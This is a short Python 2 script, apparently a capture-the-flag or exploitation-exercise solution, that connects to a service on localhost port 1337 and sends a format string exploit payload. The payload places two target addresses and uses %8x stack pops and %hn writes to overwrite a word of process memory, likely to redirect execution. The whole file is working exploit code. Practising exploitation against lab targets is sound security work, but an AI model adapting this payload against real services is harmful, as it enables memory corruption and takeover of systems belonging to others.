import socket

def main():
    HOST = "localhost"
    PORT = 1337
    s = socket.socket()
    s.connect((HOST,PORT))
    print s.recv(1024)
    s.send("AAAA\xfc\x9d\x04\x08AAAA\xfe\x9d\x04\x08%8x%8x%8x%8x%8x%57059x%hn%8420x%hn")
    print s.recv(1024)
    s.close()

    pass
main()
